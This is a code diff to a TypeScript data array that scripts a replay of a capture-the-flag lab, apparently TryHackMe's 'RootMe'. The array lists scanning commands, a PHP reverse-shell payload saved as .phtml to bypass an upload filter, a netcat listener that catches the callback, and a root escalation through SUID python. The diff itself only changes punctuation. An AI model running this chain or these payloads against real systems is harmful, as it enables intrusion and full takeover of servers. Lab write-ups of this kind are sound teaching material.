@@ -45,25 +45,25 @@ const START = Date.parse("2026-07-08T14:00:00Z");
 
 const STEPS: Step[] = [
   // --- Recon: services, web content discovery ---
-  { cmd: "nmap -sV -sC -v rootme.thm", gap: 2_000, dur: 25_000, lines: 12, volume: 1_000, out: "22/tcp OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 · 80/tcp Apache httpd 2.4.29 (Ubuntu) — Ubuntu 18.04 web server" },
+  { cmd: "nmap -sV -sC -v rootme.thm", gap: 2_000, dur: 25_000, lines: 12, volume: 1_000, out: "22/tcp OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 · 80/tcp Apache httpd 2.4.29 (Ubuntu) · Ubuntu 18.04 web server" },
   { cmd: "gobuster dir -u http://rootme.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html", gap: 20_000, dur: 90_000, lines: 14, volume: 3_000, out: "/css (Status: 301) · /js (Status: 301) · /panel (Status: 301) · /uploads (Status: 301) · /index.php (Status: 200)" },
-  { cmd: "curl -s http://rootme.thm/panel/", gap: 15_000, dur: 900, lines: 6, out: '<form action="upload.php" method="post" enctype="multipart/form-data"> — an image upload panel; page text warns "PHP files are not allowed!"' },
+  { cmd: "curl -s http://rootme.thm/panel/", gap: 15_000, dur: 900, lines: 6, out: '<form action="upload.php" method="post" enctype="multipart/form-data"> · an image upload panel; page text warns "PHP files are not allowed!"' },
 
   // --- Exploitation: extension-filter bypass, PHP reverse shell as www-data ---
-  { cmd: 'echo \'<?php system("bash -c \\\'bash -i >& /dev/tcp/x.x.x.x/1234 0>&1\\\'"); ?>\' > shell.phtml', gap: 60_000, dur: 400, lines: 1, out: "payload written as shell.phtml — the filter only checks for .php/.php3/.php4/.php5, and Apache's mod_php config still hands .phtml to the PHP interpreter; system() calls back to x.x.x.x:1234" },
+  { cmd: 'echo \'<?php system("bash -c \\\'bash -i >& /dev/tcp/x.x.x.x/1234 0>&1\\\'"); ?>\' > shell.phtml', gap: 60_000, dur: 400, lines: 1, out: "payload written as shell.phtml · the filter only checks for .php/.php3/.php4/.php5, and Apache's mod_php config still hands .phtml to the PHP interpreter; system() calls back to x.x.x.x:1234" },
   { cmd: "nc -lvnp 1234", gap: 8_000, dur: 600, lines: 1, out: "listening on [any] 1234 ..." },
-  { cmd: 'curl -F "file=@shell.phtml" http://rootme.thm/panel/upload.php', gap: 10_000, dur: 2_200, lines: 2, out: "200 OK — Successfully uploaded! stored as /uploads/shell.phtml" },
-  { cmd: "curl http://rootme.thm/uploads/shell.phtml", gap: 8_000, dur: 1_500, lines: 1, out: "request hangs — system() spawned the bash -i reverse shell against x.x.x.x:1234; www-data@rootme:/var/www/html$ (caught on the listener)" },
+  { cmd: 'curl -F "file=@shell.phtml" http://rootme.thm/panel/upload.php', gap: 10_000, dur: 2_200, lines: 2, out: "200 OK · Successfully uploaded! stored as /uploads/shell.phtml" },
+  { cmd: "curl http://rootme.thm/uploads/shell.phtml", gap: 8_000, dur: 1_500, lines: 1, out: "request hangs · system() spawned the bash -i reverse shell against x.x.x.x:1234; www-data@rootme:/var/www/html$ (caught on the listener)" },
   { cmd: "id", gap: 4_000, dur: 300, lines: 1, out: "uid=33(www-data) gid=33(www-data) groups=33(www-data)" },
-  { cmd: "python -c \"import pty; pty.spawn('/bin/bash')\"", gap: 5_000, dur: 800, lines: 1, out: "www-data@rootme:/var/www/html$ — upgraded the dumb pipe to a real pty" },
+  { cmd: "python -c \"import pty; pty.spawn('/bin/bash')\"", gap: 5_000, dur: 800, lines: 1, out: "www-data@rootme:/var/www/html$ · upgraded the dumb pipe to a real pty" },
 
   // --- Orient, capture user flag ---
   { cmd: "find / -type f -iname user.txt 2>/dev/null", gap: 30_000, dur: 6_000, lines: 1, out: "/var/www/user.txt" },
   { cmd: "cat /var/www/user.txt", gap: 3_000, dur: 300, lines: 1, out: "[flag]" },
 
   // --- Privesc: SUID python, GTFOBins ---
-  { cmd: "find / -user root -perm /4000 2>/dev/null", gap: 60_000, dur: 5_000, lines: 9, out: "/usr/bin/python — the one non-standard entry alongside the usual passwd/su/sudo/mount SUID set" },
-  { cmd: 'python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'', gap: 15_000, dur: 500, lines: 1, out: "# — /usr/bin/python is SUID root; GTFOBins' execl swap spawns /bin/sh -p, preserving the euid" },
+  { cmd: "find / -user root -perm /4000 2>/dev/null", gap: 60_000, dur: 5_000, lines: 9, out: "/usr/bin/python · the one non-standard entry alongside the usual passwd/su/sudo/mount SUID set" },
+  { cmd: 'python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'', gap: 15_000, dur: 500, lines: 1, out: "# · /usr/bin/python is SUID root; GTFOBins' execl swap spawns /bin/sh -p, preserving the euid" },
   { cmd: "whoami", gap: 2_000, dur: 200, lines: 1, out: "root" },
   { cmd: "cat /root/root.txt", gap: 5_000, dur: 300, lines: 1, out: "[flag]" },
 ];
